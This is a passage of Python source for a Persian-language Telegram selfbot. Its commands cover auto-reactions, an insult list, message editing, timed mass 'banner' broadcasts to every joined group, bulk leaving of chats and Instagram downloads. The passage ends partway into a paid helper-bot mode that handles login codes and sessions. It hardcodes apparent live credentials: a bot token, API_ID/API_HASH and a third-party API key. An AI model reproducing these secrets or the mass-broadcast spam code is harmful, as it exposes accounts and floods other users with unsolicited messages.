            user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"
            auto_reactions[str(user_id)] = reaction_emoji
            save_reactions()
            await message.edit(f"""✅ **ریکشن ثبت شد**
    👤 **کاربر:** {user_name}
    🆔 **آیدی:** `{user_id}`
    🎭 **ریکشن:** {reaction_emoji}""")
            return
    
        if len(message.command) > 2:
            username = message.command[2].lstrip('@')
            try:
                user = await client.get_users(username)
                user_id = user.id
                user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "کاربر"
                auto_reactions[str(user_id)] = reaction_emoji
                save_reactions()
                await message.edit(f"""✅ **ریکشن ثبت شد**
    👤 **کاربر:** {user_name}
    🆔 **آیدی:** `{user_id}`
    🎭 **ریکشن:** {reaction_emoji}""")
            except:
                await message.edit("❌ **کاربر یافت نشد**\nلطفاً یوزرنیم معتبر وارد کنید")
            return
        
        await message.edit("❌ **روی پیام کاربر ریپلای کنید یا یوزرنیم وارد کنید**")
    
    @app.on_message(filters.me & filters.regex(r'^لیست ریکت$'))
    async def list_reactions_command(client, message):
        if not auto_reactions:
            await message.edit("❌ **هیچ ریکشنی ثبت نشده**")
            return
        
        list_text = "📜 **لیست ریکشن‌های خودکار**\n\n"
        for user_id, reaction in auto_reactions.items():
            try:
                user = await client.get_users(int(user_id))
                user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or "بدون نام"
                list_text += f"👤 **{user_name}**\n🆔 `{user_id}` → {reaction}\n"
                list_text += "─" * 30 + "\n"
            except:
                list_text += f"👤 کاربر نامشخص\n🆔 `{user_id}` → {reaction}\n"
                list_text += "─" * 30 + "\n"
        
        list_text += f"\n📊 **تعداد:** {len(auto_reactions)} ریکشن"
        await message.edit(list_text)
    
    @app.on_message(filters.me & filters.regex(r'^پاکسازی ریکت$'))
    async def clear_reactions_command(client, message):
        if not auto_reactions:
            await message.edit("❌ **هیچ ریکشنی برای پاکسازی وجود ندارد**")
            return
        
        reaction_count = len(auto_reactions)
        auto_reactions.clear()
        save_reactions()
        
        await message.edit(f"✅ **لیست ریکشن‌ها پاکسازی شد**\n\n🗑️ **تعداد حذف شده:** {reaction_count} ریکشن")
    
    @app.on_message(filters.me & filters.command("لیست فحش", prefixes=""))
    async def insult_list_command(client: Client, message: Message):
        insults_list = load_insults()
        if not insults_list:
            return await message.edit("❌ **لیست فحش‌ها خالی است**")    
        try:
            loading_msg = await message.edit("🔄 **در حال دریافت لیست فحش‌ها...**")        
            list_text = f"💢 **لیست فحش‌ها - تعداد: {len(insults_list)}**\n\n"        
            for i, insult in enumerate(insults_list, 1):
                list_text += f"{i}. {insult}\n"
                if len(list_text) > 3500:
                    await loading_msg.edit(list_text)
                    list_text = f"💢 **ادامه لیست فحش‌ها**\n\n"
                    loading_msg = await message.reply("🔄 **در حال ادامه لیست...**")
            
            if len(list_text) > 0:
                await loading_msg.edit(list_text)
                
        except Exception as e:
            await message.edit(f"❌ **خطا در دریافت لیست فحش‌ها:**\n`{e}`")
    
    @app.on_message(filters.me & filters.command("ویرایش", prefixes="") & filters.regex(r"^ویرایش .+ به .+$"))
    async def quick_edit_command(client: Client, message: Message):
        try:
            if not message.reply_to_message:
                await message.edit("❌ **لطفا روی پیامی که می‌خواهید ویرایش کنید ریپلای کنید**")
                return
            command_parts = message.text.split()
            if len(command_parts) != 4:
                await message.edit("❌ **فرمت نادرست!**\n\n**فرمت صحیح:**\n`ویرایش کلمه_قدیمی به کلمه_جدید`\n\n**مثال:**\n`ویرایش سلان به سلام`")
                return        
            old_word = command_parts[1]
            separator = command_parts[2]
            new_word = command_parts[3]
            if separator != "به":
                await message.edit("❌ **از کلمه 'به' به عنوان جداکننده استفاده کنید**\n\n**مثال:**\n`ویرایش سلان به سلام`")
                return        
            replied_message = message.reply_to_message
            old_text = replied_message.text or replied_message.caption or ""
            if old_word not in old_text:
                await message.edit(f"❌ **کلمه '{old_word}' در پیام یافت نشد**")
                return
            new_text = old_text.replace(old_word, new_word)
            await client.edit_message_text(
                chat_id=replied_message.chat.id,
                message_id=replied_message.id,
                text=new_text
            )
            await message.delete()        
        except Exception as e:
            await message.edit(f"❌ **خطا در ویرایش:**\n`{str(e)}`")
    @app.on_message(filters.me & filters.command("تنظیم بنر", prefixes="") & filters.regex(r"^تنظیم بنر$"))
    async def set_banner_command(client: Client, message: Message):
        global banner_counter
        
        try:
            if not message.reply_to_message:
                await message.edit("❌ **لطفا روی پیامی که می‌خواهید به عنوان بنر ثبت کنید ریپلای کنید**")
                return
            
            replied_message = message.reply_to_message
            banner_id = banner_counter
            banner_counter += 1
            banners[banner_id] = {
                'message': replied_message,
                'text': replied_message.text or replied_message.caption or "",
                'media': replied_message.media,
                'created_at': datetime.now()
            }
            
            await message.edit(f"✅ **بنر با موفقیت ثبت شد**\n\n🆔 **کد بنر:** `{banner_id}`")
            
        except Exception as e:
            await message.edit(f"❌ **خطا در ثبت بنر:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("بنر همگانی", prefixes="") & filters.regex(r"^بنر همگانی \d+$"))
    async def start_broadcast_command(client: Client, message: Message):
        try:
            banner_id = int(message.command[1])
            
            if banner_id not in banners:
                await message.edit("❌ **کد بنر یافت نشد**")
                return
            active_broadcasts['global'] = {
                'banner_id': banner_id,
                'running': True,
                'start_time': datetime.now()
            }
            
            await message.edit("✅ **بنر همگانی فعال شد**\n\n🔄 ارسال بنر به گروه‌ها و سوپرگروه‌ها شروع شد")
            asyncio.create_task(send_global_banner(client, banner_id))
            
        except Exception as e:
            await message.edit(f"❌ **خطا در فعال‌سازی بنر:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("لیست بنرها", prefixes="") & filters.regex(r"^لیست بنرها$"))
    async def list_banners_command(client: Client, message: Message):
        try:
            if not banners:
                await message.edit("❌ **هیچ بنری ثبت نشده است**")
                return
            
            list_text = "📋 **لیست بنرها**\n\n"
            
            for banner_id, banner_data in banners.items():
                created_time = banner_data['created_at'].strftime("%Y-%m-%d %H:%M")
                preview = banner_data['text'][:50] + "..." if len(banner_data['text']) > 50 else banner_data['text']
                
                list_text += f"🆔 **کد:** `{banner_id}`\n"
                list_text += f"📝 **پیش‌نمایش:** {preview}\n"
                list_text += f"⏰ **زمان ثبت:** {created_time}\n"
                list_text += "─" * 30 + "\n"
            
            await message.edit(list_text)
            
        except Exception as e:
            await message.edit(f"❌ **خطا در نمایش لیست:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("بنر همگانی خاموش", prefixes="") & filters.regex(r"^بنر همگانی خاموش$"))
    async def stop_broadcast_command(client: Client, message: Message):
        try:
            if 'global' in active_broadcasts:
                active_broadcasts['global']['running'] = False
                await message.edit("✅ **بنر همگانی خاموش شد**")
            else:
                await message.edit("❌ **بنر همگانی فعال نیست**")
                
        except Exception as e:
            await message.edit(f"❌ **خطا در خاموش کردن بنر:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("بنر ارسال", prefixes="") & filters.regex(r"^بنر ارسال \d+$"))
    async def instant_broadcast_command(client: Client, message: Message):
        try:
            banner_id = int(message.command[1]) 
            
            if banner_id not in banners:
                await message.edit("❌ **کد بنر یافت نشد**")
                return
            
            await message.edit("🔄 **شروع ارسال فوری بنر...**")
            asyncio.create_task(send_instant_broadcast(client, banner_id))
            
        except Exception as e:
            await message.edit(f"❌ **خطا در ارسال بنر:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("زمان بنر", prefixes="") & filters.regex(r"^زمان بنر \d+$"))
    async def set_banner_time_command(client: Client, message: Message):
        try:
            minutes = int(message.command[1]) 
            active_broadcasts['delay'] = minutes * 60 
            
            await message.edit(f"✅ **زمان بنر تنظیم شد:** {minutes} دقیقه")
            
        except Exception as e:
            await message.edit(f"❌ **خطا در تنظیم زمان:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("فرمت", prefixes=""))
    async def format_command(client, message):
        html_tags = {
            "بولد": "<b>{}</b>",
            "ایتالیک": "<i>{}</i>",
            "زیر خط": "<u>{}</u>",
            "خط‌ خورده": "<s>{}</s>",
            "اسپویلر": "<spoiler>{}</spoiler>",
            "کد": "<code>{}</code>",
            "پیش‌ فرمت": "<pre>{}</pre>",
            "نقل‌ قول": "<blockquote>{}</blockquote>",
        }
        
        if len(message.command) < 2:
            status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
            
            for format_name, is_active in format_settings.items():
                emoji = "🟢" if is_active else "🔴"
                status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
            
            status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
            
            await message.edit(f"""
    {status_text}
    
    📝 <b>دستورات فرمت:</b>
    <code>فرمت بولد روشن</code>
    <code>فرمت بولد خاموش</code>
    <code>فرمت ایتالیک روشن</code>
    <code>فرمت ایتالیک خاموش</code>
    <code>فرمت زیر خط روشن</code>
    <code>فرمت زیر خط خاموش</code>
    <code>فرمت خط‌ خورده روشن</code>
    <code>فرمت خط‌ خورده خاموش</code>
    <code>فرمت اسپویلر روشن</code>
    <code>فرمت اسپویلر خاموش</code>
    <code>فرمت کد روشن</code>
    <code>فرمت کد خاموش</code>
    <code>فرمت پیش‌ فرمت روشن</code>
    <code>فرمت پیش‌ فرمت خاموش</code>
    <code>فرمت نقل‌ قول روشن</code>
    <code>فرمت نقل‌ قول خاموش</code>
    
    🔧 <b>سایر دستورات:</b>
    <code>فرمت وضعیت</code> - نمایش وضعیت
    <code>فرمت ریست</code> - غیرفعال کردن همه
    """, parse_mode=enums.ParseMode.HTML)
            return
        if len(message.command) == 2:
            sub_command = message.command[1]        
            if sub_command == "وضعیت":
                status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
                
                for format_name, is_active in format_settings.items():
                    emoji = "🟢" if is_active else "🔴"
                    status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
                
                status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
                await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
                return            
            elif sub_command == "ریست":
                for format_name in format_settings:
                    format_settings[format_name] = False
                await message.edit("✅ <b>همه فرمت‌ها غیرفعال شدند</b>", parse_mode=enums.ParseMode.HTML)
                return
        if len(message.command) == 3:
            format_name = message.command[1]
            action = message.command[2]        
            if format_name in format_settings:
                if action == "روشن":
                    format_settings[format_name] = True
                    sample_text = html_tags[format_name].format("این یک متن نمونه است")
                    await message.edit(f"✅ <b>فرمت {format_name} فعال شد</b>\n\n📝 <b>نمونه:</b> {sample_text}", parse_mode=enums.ParseMode.HTML)                
                elif action == "خاموش":
                    format_settings[format_name] = False
                    await message.edit(f"✅ <b>فرمت {format_name} غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)                
                else:
                    await message.edit("❌ <b>دستور نامعتبر</b>\n\n💡 از <code>روشن</code> یا <code>خاموش</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
            else:
                await message.edit(f"❌ <b>فرمت نامعتبر</b>\n\n💡 فرمت‌های معتبر: {', '.join(format_settings.keys())}", parse_mode=enums.ParseMode.HTML)
        else:
            await message.edit("❌ <b>فرمت دستور نادرست</b>\n\n💡 از <code>فرمت</code> برای مشاهده راهنما استفاده کنید", parse_mode=enums.ParseMode.HTML)
    
    @app.on_message(filters.me & filters.command("تعداد کانال ها", prefixes=""))
    async def channels_count_command(client: Client, message: Message):
        """نمایش تعداد دقیق کانال‌ها"""
        try:
            loading_msg = await message.edit("**📊 در حال شمارش کانال‌ها...**")
            
            channels_count = 0
            channels_list = []
            
            async for dialog in client.get_dialogs():
                if dialog.chat.type == enums.ChatType.CHANNEL:
                    channels_count += 1
                    channels_list.append(dialog.chat.title)
            
            result_text = f"""**📈 آمار کانال‌ها**
    
    📊 **تعداد کل کانال‌ها:** `{channels_count}`
            
    📋 **لیست کانال‌ها:**
    """
            for i, channel in enumerate(channels_list[:20], 1):
                result_text += f"{i}. {channel}\n"
            
            if len(channels_list) > 20:
                result_text += f"\n📝 و {len(channels_list) - 20} کانال دیگر..."
            
            await loading_msg.edit(result_text)
            
        except Exception as e:
            await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("تعداد گروه ها", prefixes=""))
    async def groups_count_command(client: Client, message: Message):
        """نمایش تعداد دقیق گروه‌ها"""
        try:
            loading_msg = await message.edit("**📊 در حال شمارش گروه‌ها...**")
            
            groups_count = 0
            supergroups_count = 0
            groups_list = []
            
            async for dialog in client.get_dialogs():
                if dialog.chat.type == enums.ChatType.GROUP:
                    groups_count += 1
                    groups_list.append(f"?? {dialog.chat.title}")
                elif dialog.chat.type == enums.ChatType.SUPERGROUP:
                    supergroups_count += 1
                    groups_list.append(f"👑 {dialog.chat.title}")
            
            total_groups = groups_count + supergroups_count
            
            result_text = f"""**📈 آمار گروه‌ها**
    
    📊 **تعداد کل گروه‌ها:** `{total_groups}`
    • گروه‌های معمولی: `{groups_count}`
    • سوپرگروه‌ها: `{supergroups_count}`
    
    📋 **لیست گروه‌ها:**
    """
            for i, group in enumerate(groups_list[:20], 1):
                result_text += f"{i}. {group}\n"
            
            if len(groups_list) > 20:
                result_text += f"\n📝 و {len(groups_list) - 20} گروه دیگر..."
            
            await loading_msg.edit(result_text)
            
        except Exception as e:
            await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("خروج همه کانال", prefixes=""))
    async def leave_all_channels_command(client: Client, message: Message):
        """خروج از تمام کانال‌ها با تاخیر"""
        try:
            loading_msg = await message.edit("**🔄 در حال دریافت لیست کانال‌ها...**")
            
            channels = []
            
            async for dialog in client.get_dialogs():
                if dialog.chat.type == enums.ChatType.CHANNEL:
                    channels.append(dialog.chat)
            
            if not channels:
                return await loading_msg.edit("**❌ هیچ کانالی برای خروج پیدا نشد**")
            
            await loading_msg.edit(f"**🚪 در حال خروج از {len(channels)} کانال...**")
            
            success_count = 0
            failed_count = 0
            
            for i, channel in enumerate(channels, 1):
                try:
                    await client.leave_chat(channel.id)
                    success_count += 1
                    await asyncio.sleep(4)
                    
                    if i % 5 == 0:
                        await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(channels)}")
                        
                except Exception as e:
                    failed_count += 1
                    print(f"خطا در خروج از {channel.title}: {e}")
            
            await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**
    
    📊 **نتایج:**
    • ✅ موفق: `{success_count}`
    • ❌ ناموفق: `{failed_count}`
    • 📊 کل کانال‌ها: `{len(channels)}`""")
            
        except Exception as e:
            await message.edit(f"**❌ خطا:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("خروج همه گروه", prefixes=""))
    async def leave_all_groups_command(client: Client, message: Message):
        """خروج از تمام گروه‌ها با تاخیر"""
        try:
            loading_msg = await message.edit("**🔄 در حال دریافت لیست گروه‌ها...**")
            
            groups = []
            
            async for dialog in client.get_dialogs():
                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                    groups.append(dialog.chat)
            
            if not groups:
                return await loading_msg.edit("**❌ هیچ گروهی برای خروج پیدا نشد**")
            
            await loading_msg.edit(f"**🚪 در حال خروج از {len(groups)} گروه...**")
            
            success_count = 0
            failed_count = 0
            
            for i, group in enumerate(groups, 1):
                try:
                    await client.leave_chat(group.id)
                    success_count += 1
                    await asyncio.sleep(4)
                    
                    if i % 3 == 0:
                        await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(groups)}")
                        
                except Exception as e:
                    failed_count += 1
                    print(f"خطا در خروج از {group.title}: {e}")
            
            await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**
    
    📊 **نتایج:**
    • ✅ موفق: `{success_count}`
    • ❌ ناموفق: `{failed_count}`
    • 📊 کل گروه‌ها: `{len(groups)}`""")
            
        except Exception as e:
            await message.edit(f"**❌ خطا:**\n`{str(e)}`")
    
    @app.on_message(filters.me & filters.command("اکشن", prefixes=""))
    async def action_command(client: Client, message: Message):
        if len(message.command) == 1:
            active_actions = [name for name, status in action_settings.items() if status]
            
            actions_text = """🎭 <b>سیستم اکشن خودکار</b>
    📊 <b>وضعیت فعلی:</b>
    """
            if active_actions:
                actions_text += f"✅ <b>فعال:</b> {', '.join([get_persian_action_name(name) for name in active_actions])}\n"
            else:
                actions_text += "❌ <b>هیچ اکشنی فعال نیست</b>\n"
            
            actions_text += """
    🔧 <b>دستورات:</b>
    <code>اکشن لیست</code> - نمایش لیست کامل اکشن‌ها
    <code>اکشن [نام] روشن</code> - فعال کردن اکشن
    <code>اکشن [نام] خاموش</code> - غیرفعال کردن اکشن
    <code>اکشن وضعیت</code> - نمایش وضعیت دقیق
    <code>اکشن ریست</code> - خاموش کردن همه اکشن‌ها
    
    📝 <b>مثال:</b>
    <code>اکشن تایپ روشن</code>
    <code>اکشن اپلود فایل خاموش</code>
    <code>اکشن وضعیت</code>
    """
            await message.edit(actions_text, parse_mode=enums.ParseMode.HTML)
            return
        
        sub_command = message.command[1]
        
        if sub_command == "لیست":
            actions_list = """🎭 <b>لیست کامل اکشن‌های تلگرام</b>
    
    📝 <b>اکشن‌های متنی (نمایش به کاربر):</b>
    • تایپ - ⌨️ در حال تایپ (Typing...)
    • اپلود عکس - 📸 در حال آپلود عکس (Uploading photo...)
    • ضبط ویس - 🎤 در حال ضبط ویس (Recording voice...)
    • اپلود ویدیو - 🎥 در حال آپلود ویدیو (Uploading video...)
    • اپلود فایل - 📄 در حال آپلود فایل (Uploading document...)
    • ضبط ویدیو - 🎬 در حال ضبط ویدیو (Recording video...)
    • اپلود ویس - 🎵 در حال آپلود ویس (Uploading voice...)
    • اپلود ویدیو نوت - 📹 در حال آپلود ویدیو نوت (Uploading video note...)
    • ضبط ویدیو نوت - 🎞️ در حال ضبط ویدیو نوت (Recording video note...)
    • بازی - 🎮 در حال بازی (Playing...)
    • انتخاب مخاطب - 👤 در حال انتخاب مخاطب (Choosing contact...)
    • پیدا کردن موقعیت - 📍 در حال پیدا کردن موقعیت (Finding location...)
    • انتخاب استیکر - 🎨 در حال انتخاب استیکر (Choosing sticker...)
    
    💡 <b>نکته:</b>
    وقتی کاربر پیام می‌فرستد، اکشن فعال نمایش داده می‌شود
    اکشن‌ها در پیوی و گروه کار می‌کنند"""
            await message.edit(actions_list, parse_mode=enums.ParseMode.HTML)
        
        elif sub_command == "وضعیت":
            status_text = "📊 <b>وضعیت دقیق اکشن‌ها</b>\n\n"
            
            for action_name, is_active in action_settings.items():
                emoji = "🟢" if is_active else "🔴"
                persian_name = get_persian_action_name(action_name)
                status_text += f"{emoji} <b>{persian_name}</b>: {'فعال ✅' if is_active else 'غیرفعال ❌'}\n"
            
            active_count = sum(action_settings.values())
            status_text += f"\n📈 <b>آمار:</b> {active_count} از {len(action_settings)} اکشن فعال"
            
            await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
        
        elif sub_command == "ریست":
            for key in action_settings:
                action_settings[key] = False
            
            await message.edit("✅ <b>همه اکشن‌ها خاموش شدند</b>", parse_mode=enums.ParseMode.HTML)    
        else:
            full_text = ' '.join(message.command[1:])
            if " روشن" in full_text:
                action_name_persian = full_text.replace(" روشن", "").strip()
                action_state = "روشن"
            elif " خاموش" in full_text:
                action_name_persian = full_text.replace(" خاموش", "").strip()
                action_state = "خاموش"
            else:
                await message.edit("❌ <b>فرمت دستور نادرست است</b>\n\nمثال: <code>اکشن اپلود عکس روشن</code>", parse_mode=enums.ParseMode.HTML)
                return
            action_name = get_english_action_name(action_name_persian)        
            if action_name not in action_settings:
                await message.edit(f"❌ <b>اکشن '{action_name_persian}' یافت نشد</b>\n\n📝 از دستور <code>اکشن لیست</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
                return
            
            if action_state == "روشن":
                action_settings[action_name] = True
                persian_name = get_persian_action_name(action_name)
                await message.edit(f"✅ <b>اکشن '{persian_name}' فعال شد</b>\n\nاز این به بعد وقتی کاربران پیام می‌فرستند، اکشن '{persian_name}' نمایش داده می‌شود.", parse_mode=enums.ParseMode.HTML)
            
            elif action_state == "خاموش":
                action_settings[action_name] = False
                persian_name = get_persian_action_name(action_name)
                await message.edit(f"✅ <b>اکشن '{persian_name}' غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)
    
    @app.on_message(filters.me & filters.command("اینستا", prefixes=""))
    async def instagram_download_command(client: Client, message: Message):
        """دانلود پست‌های اینستاگرام (ریل و پست عادی)"""
        try:
            if len(message.command) < 2:
                await message.edit("""
    📥 **دستور دانلود اینستاگرام**
    
    📝 **استفاده:**
    `اینستا [لینک پست یا ریل]`
    
    📌 **مثال‌ها:**
    
    `اینستا https://www.instagram.com/reel/DOkym3fCFqg/`
    
    `اینستا https://www.instagram.com/p/CzuF4KQqJ7q/`
    
    """)
                return        
            url = message.command[1].strip()
            if not url.startswith(("https://www.instagram.com/", "https://instagram.com/")):
                await message.edit("❌ **لینک نامعتبر!**\nلطفا لینک معتبر اینستاگرام وارد کنید.")
                return
            if "/stories/" in url or "/story/" in url:
                await message.edit("❌ **این دستور فقط برای پست‌ها و ریل‌ها کار می‌کند!**\nلینک استوری پشتیبانی نمی‌شود.")
                return        
            loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات از اینستاگرام...**")
            api_key = "8000978149:uJC3mxBncq9ELPN@Api_ManagerRoBot"
            api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={url}"        
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
                import urllib.parse
                encoded_url = urllib.parse.quote(url, safe='')
                final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"            
                response = requests.get(final_api_url, headers=headers, timeout=45)
                print(f"Status Code: {response.status_code}")
                print(f"Response: {response.text[:500]}")
                if response.status_code != 200:
                    await loading_msg.edit(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status_code}")
                    return
                try:
                    data = response.json()
                except json.JSONDecodeError as e:
                    await loading_msg.edit(f"❌ **پاسخ JSON نامعتبر**\n{str(e)}")
                    return
                if not data.get("ok", False):
                    error_msg = data.get("status", "خطای نامشخص")
                    await loading_msg.edit(f"❌ **خطا از سمت API**\n{error_msg}")
                    return
                if "result" not in data:
                    await loading_msg.edit("❌ **پاسخ نامعتبر از سرور**\nفیلد 'result' یافت نشد")
                    return
                
                result = data.get("result", {})
                
                if result.get("status") != "success":
                    error_detail = result.get("message", "پست یافت نشد")
                    await loading_msg.edit(f"❌ **خطا:** {error_detail}")
                    return
                posts = result.get("result", [])
                
                if not posts:
                    await loading_msg.edit("❌ **هیچ محتوایی در این پست یافت نشد**")
                    return
                post = posts[0]
                post_id = post.get('id', 'نامشخص')
                username = post.get('username', 'نامشخص')
                caption = post.get('caption', 'بدون توضیح')
                is_video = post.get('is_video', False)
                thumbnail_url = post.get('video_img', '')
                caption_text = f"""
    📸 **اینستاگرام دانلودر**
    
    👤 **صاحب پست:** @{username}
    🆔 **آیدی پست:** `{post_id}`
    
    📝 **توضیحات:**
    {caption[:500]}{'...' if len(caption) > 500 else ''}
    
    #دانلود_اینستاگرام
    """
                thumbnail_path = None
                if thumbnail_url:
                    try:
                        thumb_response = requests.get(thumbnail_url, timeout=15)
                        if thumb_response.status_code == 200:
                            thumbnail_path = f"temp_thumb_{post_id}.jpg"
                            with open(thumbnail_path, 'wb') as f:
                                f.write(thumb_response.content)
                    except:
                        thumbnail_path = None
                if is_video:
                    video_url = post.get('video_url')
                    
                    if not video_url:
                        await loading_msg.edit("❌ **لینک ویدیو یافت نشد**")
                        if thumbnail_path and os.path.exists(thumbnail_path):
                            os.remove(thumbnail_path)
                        return                
                    await loading_msg.edit("🎥 **در حال دانلود ویدیو...**")                
                    try:
                        video_response = requests.get(video_url, timeout=60)
                        
                        if video_response.status_code != 200:
                            await loading_msg.edit("❌ **خطا در دانلود ویدیو**")
                            if thumbnail_path and os.path.exists(thumbnail_path):
                                os.remove(thumbnail_path)
                            return
                        temp_file = f"temp_insta_{post_id}.mp4"
                        with open(temp_file, 'wb') as f:
                            f.write(video_response.content)
                        file_size = os.path.getsize(temp_file)
                        if file_size == 0:
                            await loading_msg.edit("❌ **فایل ویدیو خالی است**")
                            os.remove(temp_file)
                            if thumbnail_path and os.path.exists(thumbnail_path):
                                os.remove(thumbnail_path)
                            return                    
                        await loading_msg.edit("📤 **در حال آپلود ویدیو...**")                    
                        try:
                            await client.send_video(
                                chat_id=message.chat.id,
                                video=temp_file,
                                caption=caption_text,
                                thumb=thumbnail_path if thumbnail_path else None,
                                supports_streaming=True,
                                reply_to_message_id=message.id
                            )
                        except Exception as upload_error:
                            await loading_msg.edit(f"❌ **خطا در آپلود:**\n`{str(upload_error)[:100]}`")
                        if os.path.exists(temp_file):
                            os.remove(temp_file)
                        if thumbnail_path and os.path.exists(thumbnail_path):
                            os.remove(thumbnail_path)
                        
                        await loading_msg.delete()
                        
                    except Exception as e:
                        await loading_msg.edit(f"❌ **خطا در پردازش ویدیو:**\n`{str(e)[:100]}`")
                        for temp_file in [f"temp_insta_{post_id}.mp4", f"temp_thumb_{post_id}.jpg"]:
                            if os.path.exists(temp_file):
                                os.remove(temp_file)
                else:
                    media_url = thumbnail_url
                    
                    if not media_url:
                        await loading_msg.edit("❌ **لینک عکس یافت نشد**")
                        return                
                    await loading_msg.edit("🖼️ **در حال دانلود عکس...**")                
                    try:
                        image_response = requests.get(media_url, timeout=30)
                        
                        if image_response.status_code != 200:
                            await loading_msg.edit("❌ **خطا در دانلود عکس**")
                            return
                        temp_file = f"temp_insta_{post_id}.jpg"
                        with open(temp_file, 'wb') as f:
                            f.write(image_response.content)                    
                        await loading_msg.edit("📤 **در حال آپلود عکس...**")                    
                        try:
                            await client.send_photo(
                                chat_id=message.chat.id,
                                photo=temp_file,
                                caption=caption_text,
                                reply_to_message_id=message.id
                            )
                        except Exception as upload_error:
                            await loading_msg.edit(f"❌ **خطا در آپلود عکس:**\n`{str(upload_error)[:100]}`")
                        if os.path.exists(temp_file):
                            os.remove(temp_file)                    
                        await loading_msg.delete()                    
                    except Exception as e:
                        await loading_msg.edit(f"❌ **خطا در پردازش عکس:**\n`{str(e)[:100]}`")
                        if os.path.exists(f"temp_insta_{post_id}.jpg"):
                            os.remove(f"temp_insta_{post_id}.jpg")                    
            except requests.exceptions.Timeout:
                await loading_msg.edit("❌ **اتصال timeout شد**\nسرور پاسخ نداد.")
            except requests.exceptions.ConnectionError:
                await loading_msg.edit("❌ **خطا در اتصال**\nاینترنت خود را بررسی کنید.")
            except Exception as e:
                await loading_msg.edit(f"❌ **خطای غیرمنتظره:**\n`{str(e)[:150]}`")
                
        except Exception as e:
            await message.edit(f"❌ **خطای کلی:**\n`{str(e)[:150]}`")
    
    @app.on_message(filters.me & filters.command("پینگ", prefixes=""))
    async def ping_command(client: Client, message: Message):
        """بررسی سرعت ربات"""
        start_time = datetime.now()
        ping_msg = await message.edit("**⏳ در حال بررسی...**")
        end_time = datetime.now()
        
        ping_time = (end_time - start_time).microseconds / 1000
        await ping_msg.edit(f"**🏓 پونگ!**\n**⏱ سرعت: {ping_time:.2f} ms**")
    @app.on_message(filters.me & filters.command(["پنل", "panel"], prefixes=""))
    async def panel_command(client, message: Message):
            results = await client.get_inline_bot_results(bot_username, "panel")
            
            if results and results.results:
                sent_message = await client.send_inline_bot_result(
                    chat_id=message.chat.id,
                    query_id=results.query_id,
                    result_id=results.results[0].id
                )
                await message.delete()
                
            else:
                await message.reply_text("❌ پنل یافت نشد")
                await asyncio.sleep(3)
                await message.delete()
    @app.on_message(filters.me & filters.regex(r'^حذف ریکت$'))
    async def remove_reaction_command(client, message):
        if message.reply_to_message and message.reply_to_message.from_user:
            user_id = message.reply_to_message.from_user.id
            user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"
            
            if str(user_id) in auto_reactions:
                del auto_reactions[str(user_id)]
                save_reactions()
                await message.edit(f"✅ **ریکشن حذف شد**\n\n👤 کاربر: {user_name}\n🆔 آیدی: `{user_id}`")
            else:
                await message.edit(f"❌ **ریکشنی برای این کاربر ثبت نشده**")
        else:
            await message.edit("❌ **لطفاً روی پیام کاربر ریپلای کنید**")
    
    if __name__ == "__main__":
        if USER_ID:
            print(f"Selfbot running for user {USER_ID}")
            print(f"Phone: {PHONE}")
        else:
            print("Selfbot running in normal mode")
        app.run()

# ============================================================================
#                     MAIN BOT + HELPER BOT MODE
# ============================================================================
else:
    from pyrogram import Client, filters
    from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
    from pyrogram.errors import SessionPasswordNeeded
    import json, os, asyncio, subprocess, sys, time, threading
    import html
    from pyrogram import enums
    
    user_temp_codes = {}
    active_clients = {}
    BOT_TOKEN = "8623478967:AAG5Xe1uEHR5NlZogSlHvgDLu4_HHgsvBVg"
    API_ID = 37056109
    API_HASH = "3495075e20c62a67dde6c52db53ad5de"
    ADMIN_ID = 8503523539
    os.makedirs("sessions", exist_ok=True)
    
    # لیست کانال ها کم یا زیاد میتونید کنید بدون @
    FORCE_CHANNELS = [
        "amirwebcode1"
    ]
    
    
    COIN_RATE = 1440  # 1440 سکه = 60,000 تومان
    TOMAN_PER_COIN = 60000 / 1440
    card_info = {
